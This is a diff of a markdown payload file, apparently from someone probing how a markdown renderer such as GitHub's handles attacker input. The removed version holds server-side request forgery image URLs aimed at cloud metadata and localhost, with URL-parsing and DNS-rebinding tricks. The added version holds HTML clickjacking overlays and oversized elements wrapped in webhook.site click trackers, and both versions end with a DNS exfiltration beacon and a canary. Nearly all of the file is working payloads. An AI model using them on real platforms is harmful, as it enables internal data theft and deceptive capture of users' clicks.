@@ -1,131 +1,179 @@
-# Security Research - v33
+# Security Research - v34
 
-## Advanced Protocol & Header Attacks
+## GitHub Markdown HTML Attribute Testing
 
-Testing HTTP smuggling, header injection, and advanced URL manipulation.
-
----
-
-### 1) Host Header Injection via URL
-
-| Description | Image |
-|-------------|-------|
-| Basic webhook | ![1](https://webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33-control.gif) |
-| Host in path | ![2](https://1cb608ae-d469-4acd-bbab-85f5aafe70d1.webhook.site/127.0.0.1/v33.gif) |
+Testing various HTML elements and attributes for potential UI/clickjacking vulnerabilities.
 
 ---
 
-### 2) Protocol-Relative URL Variations
+### 1) Table Border Size Variations
 
-| Format | Image |
-|--------|-------|
-| //webhook.site/path | ![p1](//webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33-proto.gif) |
-| ///webhook.site/path | ![p2](///webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33-triple.gif) |
+Testing if table border validation has been fixed:
 
----
+<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/clicked-table-1">
+<table border="999999">
+<tr><td>Click test 1</td></tr>
+</table>
+</a>
 
-### 3) IPv4 mapped to IPv6 for Cloud Metadata
-
-| Format | Image |
-|--------|-------|
-| [::ffff:169.254.169.254] | ![m1](http://[::ffff:169.254.169.254]/latest/meta-data/) |
-| [0:0:0:0:0:ffff:a9fe:a9fe] | ![m2](http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/) |
-| [::169.254.169.254] | ![m3](http://[::169.254.169.254]/latest/meta-data/) |
-
----
-
-### 4) URL Parsing Differential - @ Symbol
-
-| URL | Image |
-|-----|-------|
-| http://webhook.site@169.254.169.254/ | ![a1](http://webhook.site@169.254.169.254/v33.gif) |
-| http://internal@webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/ | ![a2](http://internal@webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33.gif) |
-| http://169.254.169.254@webhook.site/ | ![a3](http://169.254.169.254@webhook.site/v33.gif) |
+<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/clicked-table-2">
+<table border="9999999999">
+<tr><td>Click test 2</td></tr>
+</table>
+</a>
 
 ---
 
-### 5) DNS Rebind with Short TTL
+### 2) KBD with Extreme Sizes
 
-| Service | Image |
-|---------|-------|
-| rebind.network | ![r1](http://rebind.network/v33.gif) |
-| 127.0.0.1.rebind.network | ![r2](http://127.0.0.1.rebind.network/v33.gif) |
-
----
-
-### 6) Unicode Hostname Normalization (IDNA)
-
-| Domain | Image |
-|--------|-------|
-| ⓦⓔⓑⓗⓞⓞⓚ.site | ![u1](http://ⓦⓔⓑⓗⓞⓞⓚ.site/v33.gif) |
-| ℌocalhost | ![u2](http://ℌocalhost/v33.gif) |
-| ⒧ocalhost | ![u3](http://⒧ocalhost/v33.gif) |
+<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/kbd-click">
+<kbd>
+<table border="1000000" align="center"></table>
+</kbd>
+</a>
 
 ---
 
-### 7) Data URI Scheme
+### 3) Ruby Annotation Overflow
 
-| Type | Image |
-|------|-------|
-| data:image/gif | ![d1](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7) |
+<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/ruby-click">
+<ruby>Normal Text<rt style="font-size:9999px">HUGE ANNOTATION</rt></ruby>
+</a>
 
----
-
-### 8) URL Whitespace Variations
-
-| Description | Image |
-|-------------|-------|
-| Tab between scheme | ![w1](http:	//webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33-tab.gif) |
-| Space in URL | ![w2](http: //webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33-space.gif) |
+<ruby>Version 2.0<rt>                                                                                                                   Hidden content padding test</rt></ruby>
 
 ---
 
-### 9) Special Characters in Subdomain
+### 4) Mark Element with Large Font
 
-| Subdomain | Image |
-|-----------|-------|
-| _internal.1cb608ae-d469-4acd-bbab-85f5aafe70d1.webhook.site | ![s1](http://_internal.1cb608ae-d469-4acd-bbab-85f5aafe70d1.webhook.site/v33.gif) |
-| -prefix.1cb608ae-d469-4acd-bbab-85f5aafe70d1.webhook.site | ![s2](http://-prefix.1cb608ae-d469-4acd-bbab-85f5aafe70d1.webhook.site/v33.gif) |
-
----
-
-### 10) GCP/Azure Metadata Endpoints
-
-| Cloud | Image |
-|-------|-------|
-| metadata.google.internal | ![g1](http://metadata.google.internal/computeMetadata/v1/) |
-| 169.254.169.254.sslip.io GCP | ![g2](http://169.254.169.254.sslip.io/computeMetadata/v1/) |
-| 169.254.169.254.nip.io Azure | ![a1](http://169.254.169.254.nip.io/metadata/instance?api-version=2021-02-01) |
+<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/mark-click">
+<mark style="font-size:9999px;position:absolute">HUGE MARK</mark>
+</a>
 
 ---
 
-### 11) URL with credentials and internal target
+### 5) Details/Summary Click Capture
 
-| URL | Image |
-|-----|-------|
-| http://admin:password@127.0.0.1:8080/ | ![c1](http://admin:password@127.0.0.1:8080/v33.gif) |
-| http://user:pass@169.254.169.254/ | ![c2](http://user:pass@169.254.169.254/latest/meta-data/) |
-| http://x@localhost/ | ![c3](http://x@localhost/v33.gif) |
+<details>
+<summary>Click to expand</summary>
+<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/details-click">
+Hidden link inside details
+</a>
+</details>
 
 ---
 
-### 12) Percent-encoded slash
+### 6) Nested Divs with Align
 
-| URL | Image |
-|-----|-------|
-| http://webhook.site%2f127.0.0.1/ | ![e1](http://webhook.site%2f127.0.0.1/v33.gif) |
-| http://webhook.site%5c127.0.0.1/ | ![e2](http://webhook.site%5c127.0.0.1/v33.gif) |
+<div align="center">
+<div align="left">
+<div align="right">
+<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/nested-div-click">
+<table border="50000" cellpadding="99999" cellspacing="99999">
+<tr><td>Nested test</td></tr>
+</table>
+</a>
+</div>
+</div>
+</div>
+
+---
+
+### 7) Image Width Percentage Abuse
+
+<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/img-click">
+<img src="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/img-load.gif" width="9999%" height="9999%">
+</a>
+
+---
+
+### 8) SUP/SUB with Position
+
+<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/sup-click">
+<sup style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">Overlay</sup>
+</a>
+
+---
+
+### 9) HR with Width Abuse
+
+<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/hr-click">
+<hr width="999999" size="999999">
+</a>
+
+---
+
+### 10) Definition List Overflow
+
+<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/dl-click">
+<dl>
+<dt style="width:9999px;height:9999px">Term</dt>
+<dd>Definition with massive term above</dd>
+</dl>
+</a>
+
+---
+
+### 11) Pre with Massive Content
+
+<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/pre-click">
+<pre style="width:9999px;white-space:nowrap">
+This is very long content that might overflow the container and create clickable areas outside normal bounds...............................................................................................................................
+</pre>
+</a>
+
+---
+
+### 12) Samp Element Test
+
+<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/samp-click">
+<samp style="display:block;width:9999px;height:9999px">Sample output with huge dimensions</samp>
+</a>
+
+---
+
+### 13) INS (Inserted) Element
+
+<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/ins-click">
+<ins style="display:block;position:absolute;width:100vw;height:100vh">Inserted content overlay</ins>
+</a>
+
+---
+
+### 14) Table Cellpadding/Cellspacing Abuse
+
+<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/cellpad-click">
+<table cellpadding="99999999" cellspacing="99999999">
+<tr><td>Content</td></tr>
+</table>
+</a>
+
+---
+
+### 15) Combined KBD + Table Attack
+
+<a href="https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/combo-click">
+<kbd>
+<table border="17111111" align="right"></table>
+</kbd>
+<kbd>
+<table border="17111111" align="left"></table>
+</kbd>
+<kbd>
+<table border="17111111" align="center"></table>
+</kbd>
+</a>
 
 ---
 
 ### DNS Exfil
 
-![dns](https://v33-dns.1cb608ae-d469-4acd-bbab-85f5aafe70d1.dnshook.site/dns.gif)
+![dns](https://v34-dns.a13fd38a-8fdd-46d9-a8cd-c1f5f3285027.dnshook.site/dns.gif)
 
 ### Canary
 
-![canary](https://webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33-canary.gif)
+![canary](https://webhook.site/a13fd38a-8fdd-46d9-a8cd-c1f5f3285027/v34-canary.gif)
 
 ---
 
-*v33 - Advanced protocol & header attacks*
+*v34 - GitHub Markdown HTML attribute testing*
